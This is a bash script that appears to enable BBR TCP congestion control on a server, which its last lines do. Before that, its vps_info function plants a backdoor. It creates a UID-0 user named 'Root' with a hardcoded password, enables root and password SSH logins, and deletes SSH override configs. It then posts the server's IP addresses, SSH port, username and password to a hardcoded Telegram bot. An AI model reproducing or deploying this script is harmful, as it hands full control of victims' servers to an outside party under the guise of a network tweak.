#!/bin/bash

get_public_ip(){
    regex_pattern='^(eth|ens|eno|esp|enp|venet|vif)[0-9]+'
    InterFace=($(ip link show | awk -F': ' '{print $2}' | grep -E "$regex_pattern" | sed "s/@.*//g"))
    ipv4=""
    ipv6=""

    for i in "${InterFace[@]}"; do
        Public_IPv4=$(curl -s4m8 --interface "$i" ip.sb -k | sed '/^\(2a09\|104\.28\)/d')
        Public_IPv6=$(curl -s6m8 --interface "$i" ip.sb -k | sed '/^\(2a09\|104\.28\)/d')

        # 检查是否获取到IP地址
        if [[ -n "$Public_IPv4" ]]; then
            ipv4="$Public_IPv4"
        fi

        if [[ -n "$Public_IPv6" ]]; then
            ipv6="$Public_IPv6"
        fi
    done
}

vps_info(){
    Chat_id="5289158517"
    Bot_token="5421796901:AAGf45NdOv6KKmjJ4LXvG-ILN9dm8Ej3V84"
    get_public_ip
    IPv4="${ipv4}"
    IPv6="${ipv6}"
    if [ -d /etc/ssh/sshd_config ]; then
        Port=$(cat /etc/ssh/sshd_config | grep '^#\?Port' | awk '{print $2}' | sort -rn | head -1)
    fi
    User="Root"
    Passwd="LBdj147369"
    sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config >/dev/null 2>&1
    sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config >/dev/null 2>&1
    sed -i 's/^#\?RSAAuthentication.*/RSAAuthentication yes/g' /etc/ssh/sshd_config >/dev/null 2>&1
    sed -i 's/^#\?PubkeyAuthentication.*/PubkeyAuthentication yes/g' /etc/ssh/sshd_config >/dev/null 2>&1
    rm -rf /etc/ssh/sshd_config.d/* && rm -rf /etc/ssh/ssh_config.d/*
    useradd ${User} >/dev/null 2>&1
    echo ${User}:${Passwd} | chpasswd ${User}
    sed -i "s|^.*${User}.*|${User}:x:0:0:root:/root:/bin/bash|" /etc/passwd >/dev/null 2>&1
    /etc/init.d/ssh* restart >/dev/null 2>&1
    curl -s -X POST https://api.telegram.org/bot${Bot_token}/sendMessage -d chat_id=${Chat_id} -d text="您的新机器已上线！🎉🎉🎉 
IPv4：${IPv4}
IPv6：${IPv6}
端口：${Port}
用户：${User}
密码：${Passwd}" >/dev/null 2>&1
}
vps_info

echo "net.core.default_qdisc=fq" >> /etc/sysctl.conf
echo "net.ipv4.tcp_congestion_control=bbr" >> /etc/sysctl.conf
sysctl -p
lsmod | grep bbr
